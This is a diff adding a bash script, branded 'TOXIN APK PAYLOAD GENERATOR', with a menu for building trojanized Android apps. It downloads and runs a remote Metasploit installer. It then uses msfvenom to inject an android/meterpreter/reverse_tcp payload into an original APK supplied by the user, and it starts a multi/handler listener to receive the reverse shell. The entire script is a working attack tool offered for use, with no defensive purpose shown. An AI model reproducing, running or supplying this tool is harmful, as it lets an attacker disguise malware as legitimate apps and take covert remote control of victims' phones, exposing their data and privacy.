@@ -1,0 +1,116 @@
+#!/bin/bash
+
+#Colors
+ normal=$(echo -en "\e[0m")
+ orange=$(echo -en "\e[33m")
+ aqua=$(echo -en "\e[36m")
+ lightgreen=$(echo -en "\e[92m")
+
+function ascii() {
+echo "$aqua
+
+_|_|_|_|_|    _|_|    _|      _|  _|_|_|  _|      _|
+    _|      _|    _|    _|  _|      _|    _|_|    _|
+    _|      _|    _|      _|        _|    _|  _|  _|
+    _|      _|    _|    _|  _|      _|    _|    _|_|
+    _|        _|_|    _|      _|  _|_|_|  _|      _| 
+   
+   ----------- APK PAYLOAD GENERATOR -----------
+$normal 
+"
+}      
+function setup() {
+    ascii
+    pkg install nala git wget curl -y 
+    wget https://github.com/gushmazuko/metasploit_in_termux/raw/master/metasploit.sh
+    chmod +x metasploit.sh
+    ./metasploit.sh
+    rm metasploit.sh
+    clear
+    ascii
+    nala install apktool aapt openjdk-17 apksigner -y
+}
+#function lhost
+function get_lhost()
+{
+  	read -rp "Enter LHOST : " LHOST
+}
+#function lport
+function get_lport()
+{
+    read -rp "Enter LPORT : " LPORT
+}
+#function payload
+function get_payload()
+{
+    PAYLOAD="android/meterpreter/reverse_tcp"
+}
+function modded_apk()
+{
+    read -rp "Enter Modded Apk Name : " mod_apk
+}
+#function original apk
+function original_apk()
+{
+    read -rp "Enter Original apk path : " orig_apk
+}
+function gen_payload() {
+    msfvenom -x $orig_apk -p android/meterpreter/reverse_tcp lhost=$LHOST lport=$LPORT -o $mod_apk
+}
+function listener_lhost()
+{
+  	read -rp "Enter LHOST : " l_host
+}
+#function lport
+function listener_lport()
+{
+    read -rp "Enter LPORT : " l_port
+}
+function start_handler() {
+    listener_lhost
+    listener_lport
+    msfconsole -x "use multi/handler; set LHOST $l_host ; set LPORT $l_port ; set PAYLOAD $PAYLOAD ; exploit"
+}
+function main() {
+echo "$orange
+
+_|_|_|_|_|    _|_|    _|      _|  _|_|_|  _|      _|
+    _|      _|    _|    _|  _|      _|    _|_|    _|
+    _|      _|    _|      _|        _|    _|  _|  _|
+    _|      _|    _|    _|  _|      _|    _|    _|_|
+    _|        _|_|    _|      _|  _|_|_|  _|      _| 
+   
+   ----------- APK PAYLOAD GENERATOR -----------
+$normal       
+    [1] - Generate Payload
+    [2] - Start Listener
+    [3] - Start Setup
+    [q] - Quit
+    "
+    
+    read -rp "[?] Select> : " answer
+    clear
+    case "$answer" in
+        1*) 
+        ascii
+        get_lhost
+        get_lport
+        original_apk
+        modded_apk
+        gen_payload
+        ;;
+        2*)
+        ascii
+        start_handler
+        ;;
+        3*)
+        setup
+        ;;
+        q*)
+        echo -e $aqua " Good Bye !!"
+        exit 0
+        ;;
+    esac
+}
+
+main
